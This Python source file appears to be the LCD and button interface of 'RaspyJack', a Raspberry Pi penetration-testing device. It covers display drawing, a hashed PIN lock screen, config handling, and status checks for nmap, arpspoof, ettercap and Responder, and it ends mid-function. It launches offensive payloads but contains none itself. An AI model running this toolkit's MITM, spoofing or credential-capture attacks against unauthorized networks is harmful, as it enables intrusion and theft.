#!/usr/bin/env python3

import base64
import hashlib
import hmac
import os
import secrets
import subprocess
import netifaces
from scapy.all import ARP, Ether, srp
from datetime import datetime
import threading, smbus, time, pyudev, serial, struct, json
from subprocess import STDOUT, check_output
from PIL import Image, ImageDraw, ImageFont, ImageColor, ImageSequence, ImageOps
import LCD_Config
import LCD_1in44
import RPi.GPIO as GPIO
import socket
import ipaddress
import signal
from functools import partial
import time
import sys
import requests  # For Discord webhook integration
import rj_input  # Virtual input bridge (WebSocket → Unix socket)

# WiFi Integration - Add dual interface support
try:
    sys.path.append('/root/Raspyjack/wifi/')
    from wifi.raspyjack_integration import (
        get_best_interface,
        get_interface_ip,
        get_interface_network,
        get_nmap_target_network,
        get_mitm_interface,
        get_responder_interface,
        get_dns_spoof_ip,
        show_interface_info,
        set_raspyjack_interface
    )
    WIFI_AVAILABLE = True
    print("✅ WiFi integration loaded - dual interface support enabled")
except ImportError as e:
    print(f"⚠️  WiFi integration not available: {e}")
    print("   Using ethernet-only mode")
    WIFI_AVAILABLE = False

    # Fallback functions for ethernet-only mode
    def get_best_interface():
        return "eth0"
    def get_interface_ip(interface):
        try:
            return subprocess.check_output(f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'", shell=True).decode().strip().split('/')[0]
        except:
            return None
    def get_nmap_target_network(interface=None):
        try:
            iface = interface or "eth0"
            return subprocess.check_output(f"ip -4 addr show {iface} | awk '/inet / {{ print $2 }}'", shell=True).decode().strip()
        except:
            return None
    def get_mitm_interface():
        return "eth0"
    def get_responder_interface():
        return "eth0"
    def get_dns_spoof_ip(interface=None):
        try:
            iface = interface or "eth0"
            return subprocess.check_output(f"ip -4 addr show {iface} | awk '/inet / {{split($2, a, \"/\"); print a[1]}}'", shell=True).decode().strip()
        except:
            return None
    def set_raspyjack_interface(interface):
        print(f"⚠️  WiFi integration not available - cannot switch to {interface}")
        return False
_stop_evt = threading.Event()
screen_lock = threading.Event()
# Flicker control
_status_text = ""
_temp_c = 0.0
draw_lock = threading.Lock()
_last_button = None
_last_button_time = 0.0
_debounce_seconds = 0.10
_button_down_since = 0.0
_repeat_delay = 0.25
_repeat_interval = 0.08
_double_click_window = 0.6
LOCK_PIN_PBKDF2_ROUNDS = 40000
LOCK_SCREEN_STATIC_SECONDS = 1.2
LOCK_MODE_PIN = "pin"
LOCK_MODE_SEQUENCE = "sequence"
LOCK_SEQUENCE_LENGTH = 6
LOCK_SEQUENCE_ALLOWED_BUTTONS = (
    "KEY_UP_PIN",
    "KEY_DOWN_PIN",
    "KEY_LEFT_PIN",
    "KEY_RIGHT_PIN",
    "KEY1_PIN",
    "KEY2_PIN",
)
LOCK_SEQUENCE_LABELS = {
    "KEY_UP_PIN": "UP",
    "KEY_DOWN_PIN": "DOWN",
    "KEY_LEFT_PIN": "LEFT",
    "KEY_RIGHT_PIN": "RIGHT",
    "KEY1_PIN": "KEY1",
    "KEY2_PIN": "KEY2",
}
LOCK_SEQUENCE_TOKENS = {
    "KEY_UP_PIN": "U",
    "KEY_DOWN_PIN": "D",
    "KEY_LEFT_PIN": "L",
    "KEY_RIGHT_PIN": "R",
    "KEY1_PIN": "1",
    "KEY2_PIN": "2",
}
LOCK_SEQUENCE_DEBOUNCE = 0.06
LOCK_DEFAULTS = {
    "enabled": False,
    "mode": LOCK_MODE_PIN,
    "pin_hash": "",
    "sequence_hash": "",
    "sequence_length": LOCK_SEQUENCE_LENGTH,
    "auto_lock_seconds": 0,
}
LOCK_TIMEOUT_OPTIONS = [
    (0, "Never"),
    (15, "15 sec"),
    (30, "30 sec"),
    (60, "1 min"),
    (300, "5 min"),
    (600, "10 min"),
]
lock_config = LOCK_DEFAULTS.copy()
lock_runtime = {
    "locked": False,
    "last_activity": time.monotonic(),
    "in_lock_flow": False,
    "suspend_auto_lock": False,
    "showing_screensaver": False,
}
_lock_screensaver_cache = {
    "path": None,
    "mtime": None,
    "frames": [],
    "durations": [],
}

# WebUI frame mirror (used by device_server.py)
FRAME_MIRROR_PATH = os.environ.get("RJ_FRAME_PATH", "/dev/shm/raspyjack_last.jpg")
FRAME_MIRROR_ENABLED = os.environ.get("RJ_FRAME_MIRROR", "1") != "0"
CARDPUTER_FRAME_PATH = os.environ.get("RJ_CARDPUTER_FRAME_PATH", "/dev/shm/raspyjack_cardputer.jpg")
CARDPUTER_FRAME_ENABLED = os.environ.get("RJ_CARDPUTER_FRAME_ENABLED", "1") != "0"
CARDPUTER_FRAME_MODE = str(os.environ.get("RJ_CARDPUTER_FRAME_MODE", "stretch") or "stretch").strip().lower()
CARDPUTER_FRAME_WIDTH = max(1, int(os.environ.get("RJ_CARDPUTER_FRAME_WIDTH", "240")))
CARDPUTER_FRAME_HEIGHT = max(1, int(os.environ.get("RJ_CARDPUTER_FRAME_HEIGHT", "135")))
CARDPUTER_FRAME_QUALITY = min(100, max(1, int(os.environ.get("RJ_CARDPUTER_FRAME_QUALITY", "56"))))
CARDPUTER_FRAME_SUBSAMPLING = min(2, max(0, int(os.environ.get("RJ_CARDPUTER_FRAME_SUBSAMPLING", "2"))))
try:
    _frame_fps = float(os.environ.get("RJ_FRAME_FPS", "10"))
    FRAME_MIRROR_INTERVAL = 1.0 / max(1.0, _frame_fps)
except Exception:
    FRAME_MIRROR_INTERVAL = 0.1
try:
    _cardputer_frame_fps = float(os.environ.get("RJ_CARDPUTER_FRAME_FPS", "6"))
    CARDPUTER_FRAME_INTERVAL = 1.0 / max(1.0, _cardputer_frame_fps)
except Exception:
    CARDPUTER_FRAME_INTERVAL = 1.0 / 6.0

try:
    _resampling_lanczos = Image.Resampling.LANCZOS
except AttributeError:
    _resampling_lanczos = Image.LANCZOS


def _build_cardputer_frame(src_image):
    if CARDPUTER_FRAME_MODE == "stretch":
        return src_image.resize((CARDPUTER_FRAME_WIDTH, CARDPUTER_FRAME_HEIGHT), _resampling_lanczos)
    if CARDPUTER_FRAME_MODE == "contain":
        return ImageOps.contain(src_image, (CARDPUTER_FRAME_WIDTH, CARDPUTER_FRAME_HEIGHT), _resampling_lanczos)
    return ImageOps.fit(src_image, (CARDPUTER_FRAME_WIDTH, CARDPUTER_FRAME_HEIGHT), _resampling_lanczos)


def _save_cardputer_frame(src_image):
    if not CARDPUTER_FRAME_ENABLED:
        return
    try:
        cardputer_frame = _build_cardputer_frame(src_image)
        if cardputer_frame.size != (CARDPUTER_FRAME_WIDTH, CARDPUTER_FRAME_HEIGHT):
            canvas = Image.new("RGB", (CARDPUTER_FRAME_WIDTH, CARDPUTER_FRAME_HEIGHT), "black")
            offset_x = max(0, (CARDPUTER_FRAME_WIDTH - cardputer_frame.width) // 2)
            offset_y = max(0, (CARDPUTER_FRAME_HEIGHT - cardputer_frame.height) // 2)
            canvas.paste(cardputer_frame, (offset_x, offset_y))
            cardputer_frame = canvas
        cardputer_frame.save(
            CARDPUTER_FRAME_PATH,
            "JPEG",
            quality=CARDPUTER_FRAME_QUALITY,
            subsampling=CARDPUTER_FRAME_SUBSAMPLING,
        )
    except Exception:
        pass

def _set_last_button(name, ts):
    global _last_button, _last_button_time, _button_down_since
    _last_button = name
    _last_button_time = ts
    _button_down_since = ts


def _log_virtual_consume(stage, button):
    try:
        print(f"[virtual_consume] {stage}: {button}", flush=True)
    except Exception:
        pass

# https://www.waveshare.com/wiki/File:1.44inch-LCD-HAT-Code.7z

def _stats_loop():
    global _status_text, _temp_c
    while not _stop_evt.is_set():
        if screen_lock.is_set():
            time.sleep(0.5)
            continue
        try:
            _temp_c = temp()
            status = ""
            if subprocess.call(['pgrep', 'nmap'], stdout=subprocess.DEVNULL) == 0:
                status = "(Scan in progress)"
            elif is_mitm_running():
                status = "(MITM & sniff)"
            elif subprocess.call(['pgrep', 'ettercap'], stdout=subprocess.DEVNULL) == 0:
                status = "(DNSSpoof)"
            if is_responder_running():
                status = "(Responder)"
            _status_text = status
            if not lock_runtime.get("showing_screensaver"):
                try:
                    draw_lock.acquire()
                    _draw_toolbar()
                finally:
                    draw_lock.release()
        except Exception:
            pass
        time.sleep(2)

_display_dirty = True  # flag: image changed, needs refresh

def mark_display_dirty():
    global _display_dirty
    _display_dirty = True

def _display_loop():
    global _display_dirty
    last_frame_save = 0.0
    last_cardputer_frame_save = 0.0
    while not _stop_evt.is_set():
        if not screen_lock.is_set() and _display_dirty:
            mirror_image = None
            save_webui_frame = False
            save_cardputer_frame = False
            try:
                draw_lock.acquire()
                LCD.LCD_ShowImage(image, 0, 0)
                _display_dirty = False
                if FRAME_MIRROR_ENABLED or CARDPUTER_FRAME_ENABLED:
                    now = time.monotonic()
                    save_webui_frame = FRAME_MIRROR_ENABLED and (now - last_frame_save) >= FRAME_MIRROR_INTERVAL
                    save_cardputer_frame = CARDPUTER_FRAME_ENABLED and (now - last_cardputer_frame_save) >= CARDPUTER_FRAME_INTERVAL
                    if save_webui_frame or save_cardputer_frame:
                        mirror_image = image.copy()
                    if save_webui_frame:
                        last_frame_save = now
                    if save_cardputer_frame:
                        last_cardputer_frame_save = now
            finally:
                draw_lock.release()
            if mirror_image is not None:
                if save_webui_frame:
                    try:
                        mirror_image.save(FRAME_MIRROR_PATH, "JPEG", quality=80)
                    except Exception:
                        pass
                if save_cardputer_frame:
                    _save_cardputer_frame(mirror_image)
        time.sleep(0.1)

def start_background_loops():
    threading.Thread(target=_stats_loop,   daemon=True).start()
    threading.Thread(target=_display_loop, daemon=True).start()

if os.getuid() != 0:
        print("You need a sudo to run this!")
        exit()
print(" ")
print(" ------ RaspyJack Started !!! ------ ")
start_time = time.time()

####### Classes except menu #######
# Screen dimensions (read from LCD driver at import time)
_SCR_W = LCD_1in44.LCD_WIDTH
_SCR_H = LCD_1in44.LCD_HEIGHT
_SCALE = _SCR_W / 128  # 1.0 for 128x128, 1.875 for 240x240

def S(v):
    """Scale a pixel value from 128-base to current screen resolution."""
    return int(v * _SCALE)

### Global mostly static values ###
class Defaults():
    start_text = [S(12), S(22)]
    text_gap = S(14)

    updown_center = S(52)
    updown_pos = [S(15), updown_center, S(88)]


    imgstart_path = "/root/"

    install_path = "/root/Raspyjack/"
    config_file = install_path + "gui_conf.json"
    screensaver_gif = install_path + "img/screensaver/default.gif"

    payload_path = install_path + "payloads/"
    payload_log  = install_path + "loot/payload.log"


### Color scheme class ###
class template():
    # Color values
    border = "#0e0e6b"
    background = "#000000"
    text = "#9c9ccc"
    selected_text = "#EEEEEE"
    select = "#141494"
    gamepad = select
    gamepad_fill = selected_text

    # Render the border
    def DrawBorder(self):
        w, h = _SCR_W, _SCR_H
        bw = S(5)
        by = S(12)
        draw.line([(w - 1, by), (w - 1, h - 1)], fill=self.border, width=bw)
        draw.line([(w - 1, h - 1), (0, h - 1)], fill=self.border, width=bw)
        draw.line([(0, h - 1), (0, by)], fill=self.border, width=bw)
        draw.line([(0, by), (w, by)], fill=self.border, width=bw)

    # Render inside of the border
    def DrawMenuBackground(self):
        draw.rectangle((S(3), S(14), _SCR_W - S(4), _SCR_H - S(4)), fill=self.background)
        mark_display_dirty()

    # I don't know how to python pass 'class.variable' as reference properly
    def Set(self, index, color):
        if index == 0:
            self.background = color
        elif index == 1:
            self.border = color
            self.DrawBorder()
        elif index == 2:
            self.text = color
        elif index == 3:
            self.selected_text = color
        elif index == 4:
            self.select = color
        elif index == 5:
            self.gamepad = color
        elif index == 6:
            self.gamepad_fill = color

    def Get(self, index):
        if index == 0:
            return self.background
        elif index == 1:
            return self.border
        elif index == 2:
            return self.text
        elif index == 3:
            return self.selected_text
        elif index == 4:
            return self.select
        elif index == 5:
            return self.gamepad
        elif index == 6:
            return self.gamepad_fill

    # Methods for JSON export
    def Dictonary(self):
        x = {
            "BORDER" : self.border,
            "BACKGROUND" : self.background,
            "TEXT" : self.text,
            "SELECTED_TEXT" : self.selected_text,
            "SELECTED_TEXT_BACKGROUND" : self.select,
            "GAMEPAD" : self.gamepad,
            "GAMEPAD_FILL" : self.gamepad_fill
        }
        return x
    def LoadDictonary(self, dic):
        self.Set(1,dic["BORDER"])
        self.background = dic["BACKGROUND"]
        self.text = dic["TEXT"]
        self.selected_text = dic["SELECTED_TEXT"]
        self.select = dic["SELECTED_TEXT_BACKGROUND"]
        self.gamepad = dic["GAMEPAD"]
        self.gamepad_fill = dic["GAMEPAD_FILL"]

####### Simple methods #######
### Get any button press ###
def getButton():
    global _last_button, _last_button_time, _button_down_since
    while 1:
        if _should_auto_lock():
            lock_device("Auto lock")
            continue
        # WebUI payload requests: launch immediately while waiting for input
        if not screen_lock.is_set():
            requested = _check_payload_request()
            if requested:
                exec_payload(requested)
                continue
        # 1) virtual buttons from Web UI
        v = rj_input.get_virtual_button()
        if v:
            _log_virtual_consume("getButton", v)
            _mark_user_activity()
            return v
        pressed = None
        for item in PINS:
            if GPIO.input(PINS[item]) == 0:
                pressed = item
                break
        if pressed is None:
            if _last_button is not None:
                _set_last_button(None, time.time())
            time.sleep(0.01)
            continue

        now = time.time()
        if pressed != _last_button:
            _set_last_button(pressed, now)
            _mark_user_activity()
            return pressed

        # Same button still held: debounce first, then allow auto-repeat
        if (now - _last_button_time) < _debounce_seconds:
            time.sleep(0.01)
            continue
        if (now - _button_down_since) >= _repeat_delay and (now - _last_button_time) >= _repeat_interval:
            _last_button_time = now
            _mark_user_activity()
            return pressed
        time.sleep(0.01)

def temp() -> float:
    with open("/sys/class/thermal/thermal_zone0/temp") as f:
        return int(f.read()) / 1000


def _iface_carrier_up(name: str) -> bool:
    try:
        with open(f"/sys/class/net/{name}/carrier", "r") as f:
            return f.read().strip() == "1"
    except Exception:
        return False


def get_best_interface_prefer_eth() -> str:
    """Prefer wired interface when link is up, otherwise fall back."""
    eth_candidate = None
    for name in ("eth0", "eth1"):
        if _iface_carrier_up(name):
            ip = get_interface_ip(name)
            if ip:
                return name
            eth_candidate = eth_candidate or name
    if eth_candidate:
        return eth_candidate
    return get_best_interface()


def Leave(poweroff: bool = False) -> None:
    _stop_evt.set()
    GPIO.cleanup()
    if poweroff:
        os.system("sync && poweroff")
    print("Bye!")
    sys.exit(0)


def Restart():
    print("Restarting the UI!")
    Dialog("Restarting!", False)
    arg = ["-n","-5",os.sys.executable] + sys.argv
    os.execv(os.popen("whereis nice").read().split(" ")[1], arg)
    Leave()


def safe_kill(*names):
    for name in names:
        subprocess.run(
            ["pkill", "-9", "-x", name],      # -x = nom exact
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

### Two threaded functions ###
# One for updating status bar and one for refreshing display #
def is_responder_running():
    time.sleep(1)
    ps_command = "ps aux | grep Responder.py | grep -v grep | awk '{print $2}'"
    try:
        output = subprocess.check_output(ps_command, shell=True)
        pid = int(output.strip())
        return True
    except (subprocess.CalledProcessError, ValueError):
        return False

def is_mitm_running():
    time.sleep(1)
    tcpdump_running = subprocess.call(['pgrep', 'tcpdump'], stdout=subprocess.DEVNULL) == 0
    arpspoof_running = subprocess.call(['pgrep', 'arpspoof'], stdout=subprocess.DEVNULL) == 0
    return tcpdump_running or arpspoof_running


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def _normalize_lock_config(raw: dict | None) -> dict[str, object]:
    cfg = raw if isinstance(raw, dict) else {}
    normalized = LOCK_DEFAULTS.copy()
    normalized["enabled"] = bool(cfg.get("enabled", normalized["enabled"]))
    mode = str(cfg.get("mode", cfg.get("lock_type", normalized["mode"])) or normalized["mode"]).strip().lower()
    if mode not in (LOCK_MODE_PIN, LOCK_MODE_SEQUENCE):
        mode = LOCK_MODE_PIN
    normalized["mode"] = mode
    normalized["pin_hash"] = str(cfg.get("pin_hash", normalized["pin_hash"]) or "").strip()
    normalized["sequence_hash"] = str(cfg.get("sequence_hash", normalized["sequence_hash"]) or "").strip()
    normalized["sequence_length"] = LOCK_SEQUENCE_LENGTH
    try:
        auto_lock_seconds = int(cfg.get("auto_lock_seconds", normalized["auto_lock_seconds"]))
    except (TypeError, ValueError):
        auto_lock_seconds = int(normalized["auto_lock_seconds"])
    normalized["auto_lock_seconds"] = max(0, auto_lock_seconds)
    if not normalized["pin_hash"] and normalized["sequence_hash"] and "mode" not in cfg and "lock_type" not in cfg:
        normalized["mode"] = LOCK_MODE_SEQUENCE
    if normalized["enabled"] and not _lock_config_has_secret(normalized, str(normalized["mode"])):
        normalized["enabled"] = False
    return normalized


def _lock_config_has_secret(config: dict[str, object], mode: str | None = None) -> bool:
    selected_mode = str(mode or config.get("mode") or LOCK_MODE_PIN)
    if selected_mode == LOCK_MODE_SEQUENCE:
        return bool(str(config.get("sequence_hash") or "").strip())
    return bool(str(config.get("pin_hash") or "").strip())


def _lock_mode() -> str:
    mode = str(lock_config.get("mode") or LOCK_MODE_PIN)
    return mode if mode in (LOCK_MODE_PIN, LOCK_MODE_SEQUENCE) else LOCK_MODE_PIN


def _lock_mode_label(mode: str | None = None) -> str:
    return "Sequence" if (mode or _lock_mode()) == LOCK_MODE_SEQUENCE else "PIN"


def _lock_has_pin() -> bool:
    return bool(str(lock_config.get("pin_hash") or "").strip())


def _lock_has_sequence() -> bool:
    return bool(str(lock_config.get("sequence_hash") or "").strip())


def _lock_has_secret(mode: str | None = None) -> bool:
    return _lock_config_has_secret(lock_config, mode or _lock_mode())


def _lock_is_enabled() -> bool:
    return bool(lock_config.get("enabled")) and _lock_has_secret()


def _mark_user_activity() -> None:
    lock_runtime["last_activity"] = time.monotonic()


def _should_auto_lock() -> bool:
    if lock_runtime["locked"] or lock_runtime["in_lock_flow"] or lock_runtime["suspend_auto_lock"]:
        return False
    if not _lock_is_enabled():
        return False
    timeout = int(lock_config.get("auto_lock_seconds") or 0)
    if timeout <= 0:
        return False
    return (time.monotonic() - float(lock_runtime.get("last_activity") or 0.0)) >= timeout


def _lock_timeout_label(seconds: int | None = None) -> str:
    value = int(lock_config.get("auto_lock_seconds") or 0) if seconds is None else int(seconds)
    for candidate, label in LOCK_TIMEOUT_OPTIONS:
        if candidate == value:
            return label
    if value <= 0:
        return "Never"
    return f"{value} sec"


def _handle_main_menu_key3_double_click() -> bool:
    deadline = time.monotonic() + _double_click_window
    key3_released = False
    while time.monotonic() < deadline:
        try:
            if GPIO.input(PINS["KEY3_PIN"]) != 0:
                key3_released = True
            elif key3_released:
                _mark_user_activity()
                if _lock_has_secret():
                    lock_device("Locked")
                else:
                    Dialog_info(f"Set {_lock_mode_label()} first", wait=False, timeout=1.0)
                return True
        except Exception:
            pass
        virtual_button = rj_input.get_virtual_button()
        if virtual_button == "KEY3_PIN":
            _log_virtual_consume("main_menu_key3_double_click", virtual_button)
            _mark_user_activity()
            if _lock_has_secret():
                lock_device("Locked")
            else:
                Dialog_info(f"Set {_lock_mode_label()} first", wait=False, timeout=1.0)
            return True
        time.sleep(0.01)
    return False


def _serialize_sequence(sequence: list[str]) -> str:
    return "|".join(sequence)


def _hash_pin(pin: str, rounds: int = LOCK_PIN_PBKDF2_ROUNDS) -> str:
    salt = secrets.token_hex(16)
    dk = hashlib.pbkdf2_hmac("sha256", pin.encode("utf-8"), salt.encode("utf-8"), rounds)
    return f"pbkdf2_sha256${rounds}${salt}${_b64url_encode(dk)}"


def _parse_pin_hash(encoded: str) -> tuple[str, int, str, str] | None:
    try:
        algo, rounds, salt, digest = encoded.split("$", 3)
        return algo, int(rounds), salt, digest
    except Exception:
        return None


def _verify_pin(pin: str, encoded: str) -> bool:
    parsed = _parse_pin_hash(encoded)
    if not parsed:
        return False
    algo, rounds, salt, digest = parsed
    if algo != "pbkdf2_sha256":
        return False
    try:
        dk = hashlib.pbkdf2_hmac("sha256", pin.encode("utf-8"), salt.encode("utf-8"), rounds)
        return hmac.compare_digest(_b64url_encode(dk), digest)
    except Exception:
        return False


def _hash_sequence(sequence: list[str], rounds: int = LOCK_PIN_PBKDF2_ROUNDS) -> str:
    return _hash_pin(_serialize_sequence(sequence), rounds=rounds)


def _verify_sequence(sequence: list[str], encoded: str) -> bool:
    return _verify_pin(_serialize_sequence(sequence), encoded)


def _should_rehash_pin(encoded: str) -> bool:
    parsed = _parse_pin_hash(encoded)
    if not parsed:
        return False
    algo, rounds, _salt, _digest = parsed
    return algo == "pbkdf2_sha256" and rounds != LOCK_PIN_PBKDF2_ROUNDS


def _rehash_pin_if_needed(pin: str, encoded: str) -> None:
    if not _should_rehash_pin(encoded):
        return
    lock_config["pin_hash"] = _hash_pin(pin)
    SaveConfig()


def _rehash_sequence_if_needed(sequence: list[str], encoded: str) -> None:
    if not _should_rehash_pin(encoded):
        return
    lock_config["sequence_hash"] = _hash_sequence(sequence)
    SaveConfig()


def _wait_for_button_release(timeout: float = 1.0) -> None:
    deadline = time.monotonic() + max(0.0, timeout)
    while time.monotonic() < deadline:
        try:
            physical_released = all(GPIO.input(pin) != 0 for pin in PINS.values())
            virtual_released = not rj_input.get_held_buttons()
            if physical_released and virtual_released:
                return
        except Exception:
            if not rj_input.get_held_buttons():
                return
        time.sleep(0.01)


def _write_config_atomic(data: dict) -> None:
    os.makedirs(os.path.dirname(default.config_file), exist_ok=True)
    tmp_path = default.config_file + ".tmp"
    try:
        with open(tmp_path, "w", encoding="utf-8") as wf:
            json.dump(data, wf, indent=4, sort_keys=True)
        os.replace(tmp_path, default.config_file)
        try:
            os.chmod(default.config_file, 0o600)
        except Exception:
            pass
    finally:
        if os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception:
                pass


_flip_enabled = False  # screen + controls flipped 180 degrees

_ORIGINAL_PINS = {
    "KEY_UP_PIN": 6, "KEY_DOWN_PIN": 19,
    "KEY_LEFT_PIN": 5, "KEY_RIGHT_PIN": 26,
    "KEY_PRESS_PIN": 13, "KEY1_PIN": 21,
    "KEY2_PIN": 20, "KEY3_PIN": 16,
}

def SaveConfig() -> None:
    data = {
        "DISPLAY": {
            "type": getattr(LCD_1in44, '_DISPLAY_TYPE', 'ST7789_240'),
            "supported_types": ["ST7735_128", "ST7789_240"],
            "flip": _flip_enabled,
        },
        "PINS":   _ORIGINAL_PINS,
        "PATHS":  {
            "IMAGEBROWSER_START": default.imgstart_path,
            "SCREENSAVER_GIF": default.screensaver_gif,
        },
        "COLORS": color.Dictonary(),
        "LOCK":   {
            "enabled": bool(lock_config.get("enabled")),
            "mode": _lock_mode(),
            "pin_hash": str(lock_config.get("pin_hash") or ""),
            "sequence_hash": str(lock_config.get("sequence_hash") or ""),
            "sequence_length": LOCK_SEQUENCE_LENGTH,
            "auto_lock_seconds": max(0, int(lock_config.get("auto_lock_seconds") or 0)),
        },
    }
    print(json.dumps(data, indent=4, sort_keys=True))
    _write_config_atomic(data)
    print("Config has been saved!")



def _apply_flip(pins):
    """Swap UP/DOWN, LEFT/RIGHT, KEY1/KEY3 for 180-degree flip."""
    flipped = dict(pins)
    flipped["KEY_UP_PIN"], flipped["KEY_DOWN_PIN"] = pins["KEY_DOWN_PIN"], pins["KEY_UP_PIN"]
    flipped["KEY_LEFT_PIN"], flipped["KEY_RIGHT_PIN"] = pins["KEY_RIGHT_PIN"], pins["KEY_LEFT_PIN"]
    flipped["KEY1_PIN"], flipped["KEY3_PIN"] = pins["KEY3_PIN"], pins["KEY1_PIN"]
    return flipped


def LoadConfig():
    global PINS
    global default
    global lock_config
    global _flip_enabled

    if not (os.path.exists(default.config_file) and os.path.isfile(default.config_file)):
        print("Can't find a config file! Creating one at '" + default.config_file + "'...")
        SaveConfig()

    with open(default.config_file, "r", encoding="utf-8") as rf:
        data = json.load(rf)
        default.imgstart_path = data["PATHS"].get("IMAGEBROWSER_START", default.imgstart_path)
        default.screensaver_gif = data["PATHS"].get("SCREENSAVER_GIF", default.screensaver_gif)
        PINS = data.get("PINS", PINS)
        lock_config = _normalize_lock_config(data.get("LOCK"))
        _flip_enabled = data.get("DISPLAY", {}).get("flip", False)
        if _flip_enabled:
            PINS = _apply_flip(PINS)
        try:
            color.LoadDictonary(data["COLORS"])
        except:
            pass
        GPIO.setmode(GPIO.BCM)
        for item in PINS:
            GPIO.setup(PINS[item], GPIO.IN, pull_up_down=GPIO.PUD_UP)
    print(f"Config loaded! (flip={'ON' if _flip_enabled else 'OFF'})")


def ToggleFlip():
    """Toggle 180-degree screen and controls flip, save and restart."""
    global _flip_enabled
    _flip_enabled = not _flip_enabled
    SaveConfig()
    Dialog_info(
        f"Flip {'ON' if _flip_enabled else 'OFF'}\nRestarting...",
        wait=False, timeout=1.5,
    )
    time.sleep(1.5)
    Restart()


####### Drawing functions #######

def _draw_toolbar():
    try:
        draw.line([(0, S(4)), (_SCR_W, S(4))], fill="#222", width=S(10))
        draw.text((0, 0), f"{_temp_c:.0f} °C ", fill="WHITE", font=font)
        if _status_text:
            draw.text((S(30), 0), _status_text, fill="WHITE", font=font)
        mark_display_dirty()
    except Exception:
        pass

def _wrap_text_to_width(text, max_width, font=None):
    if font is None:
        font = text_font
    lines = []
    for raw_line in (text.splitlines() if text else [""]):
        words = raw_line.split(" ")
        if not words:
            lines.append("")
            continue
        current = ""
        for word in words:
            trial = word if current == "" else current + " " + word
            bbox = draw.textbbox((0, 0), trial, font=font)
            if bbox[2] - bbox[0] <= max_width:
                current = trial
                continue
            if current:
                lines.append(current)
                current = word
            else:
                # Single word too long: split by characters
                chunk = ""
                for ch in word:
                    trial_chunk = chunk + ch
                    bbox = draw.textbbox((0, 0), trial_chunk, font=font)
                    if bbox[2] - bbox[0] <= max_width:
                        chunk = trial_chunk
                    else:
                        if chunk:
                            lines.append(chunk)
                        chunk = ch
                current = chunk
        lines.append(current)
    return lines

def _truncate_to_width(text, max_width, font=None, ellipsis="…"):
    if font is None:
        font = text_font
    if text is None:
        return ""
    if max_width <= 0:
        return ""
    if draw.textbbox((0, 0), text, font=font)[2] <= max_width:
        return text
    # Leave room for ellipsis
    ell_w = draw.textbbox((0, 0), ellipsis, font=font)[2]
    if ell_w >= max_width:
        return ellipsis
    lo, hi = 0, len(text)
    best = ""
    while lo <= hi:
        mid = (lo + hi) // 2
        candidate = text[:mid]
        w = draw.textbbox((0, 0), candidate, font=font)[2]
        if w + ell_w <= max_width:
            best = candidate
            lo = mid + 1
        else:
            hi = mid - 1
    return best + ellipsis

def _draw_centered_text(box, text, fill="WHITE", font=None, line_gap=2):
    """Draw text centered in a box (x0,y0,x1,y1). Supports multiline."""
    if font is None:
        font = text_font
    x0, y0, x1, y1 = box
    max_width = x1 - x0
    lines = _wrap_text_to_width(text, max_width, font)
    line_sizes = []
    total_h = 0
    for line in lines:
        bbox = draw.textbbox((0, 0), line, font=font)
        w = bbox[2] - bbox[0]
        h = bbox[3] - bbox[1]
        line_sizes.append((line, w, h))
        total_h += h
    if len(lines) > 1:
        total_h += line_gap * (len(lines) - 1)

    box_w = x1 - x0
    box_h = y1 - y0
    y = y0 + max(0, (box_h - total_h) // 2)
    for line, w, h in line_sizes:
        x = x0 + max(0, (box_w - w) // 2)
        draw.text((x, y), line, fill=fill, font=font)
        y += h + line_gap


def _draw_lock_screen(title: str, prompt: str, entered: list[str] | None = None,
                      selection: tuple[int, int] = (0, 0), allow_cancel: bool = True) -> None:
    keypad = (("1", "2", "3"), ("4", "5", "6"), ("7", "8", "9"), ("C", "0", "OK"))
    entered = entered or []
    selected_row, selected_col = selection
    try:
        draw_lock.acquire()
        draw.rectangle((0, 0, _SCR_W - 1, _SCR_H - 1), fill=color.background)
        _draw_toolbar()
        color.DrawBorder()
        draw.text((S(8), S(16)), _truncate_to_width(title, _SCR_W - S(18), text_font), fill=color.selected_text, font=text_font)
        draw.text((S(8), S(28)), _truncate_to_width(prompt, _SCR_W - S(18), font), fill=color.text, font=font)

        slot_w = S(18)
        slot_gap = S(6)
        total_w = (slot_w * 4) + (slot_gap * 3)
        slot_x = max(S(10), (_SCR_W - total_w) // 2)
        slot_y = S(40)
        for index in range(4):
            x0 = slot_x + (index * (slot_w + slot_gap))
            x1 = x0 + slot_w
            y0 = slot_y
            y1 = y0 + S(18)
            filled = index < len(entered)
            box_fill = color.select if filled else "#07140b"
            box_outline = color.selected_text if filled else color.border
            box_text = "*" if filled else "•"
            box_text_fill = color.selected_text if filled else "#446b52"
            draw.rounded_rectangle((x0, y0, x1, y1), radius=S(3), outline=box_outline, fill=box_fill)
            _draw_centered_text((x0, y0 + 1, x1, y1), box_text, fill=box_text_fill, font=text_font)

        cell_w = S(28)
        cell_h = S(12)
        cell_gap_x = S(6)
        cell_gap_y = S(4)
        total_keypad_w = (cell_w * 3) + (cell_gap_x * 2)
        total_keypad_h = (cell_h * 4) + (cell_gap_y * 3)
        start_x = max(S(8), (_SCR_W - total_keypad_w) // 2)
        start_y = S(62)
        for row_index, row in enumerate(keypad):
            for col_index, key in enumerate(row):
                x0 = start_x + (col_index * (cell_w + cell_gap_x))
                y0 = start_y + (row_index * (cell_h + cell_gap_y))
                x1 = x0 + cell_w
                y1 = y0 + cell_h
                is_selected = row_index == selected_row and col_index == selected_col
                fill = color.select if is_selected else "#07140b"
                outline = color.selected_text if is_selected else color.border
                text_fill = color.selected_text if is_selected else color.text
                draw.rounded_rectangle((x0, y0, x1, y1), radius=S(3), outline=outline, fill=fill)
                key_font = text_font if len(key) == 1 else font
                key_bbox = draw.textbbox((0, 0), key, font=key_font)
                key_w = key_bbox[2] - key_bbox[0]
                key_h = key_bbox[3] - key_bbox[1]
                text_x = x0 + max(0, (cell_w - key_w) // 2) - key_bbox[0]
                text_y = y0 + max(0, (cell_h - key_h) // 2) - key_bbox[1]
                if len(key) == 1:
                    text_y += S(1)
                draw.text((text_x, text_y), key, fill=text_fill, font=key_font)
    finally:
        draw_lock.release()


def _draw_sequence_screen(title: str, prompt: str, entered: list[str] | None = None,
                          allow_cancel: bool = True, allow_hide: bool = False,
                          mask_entered: bool = False) -> None:
    entered = entered or []
    controls = "OK=clear K3=Exit"
    try:
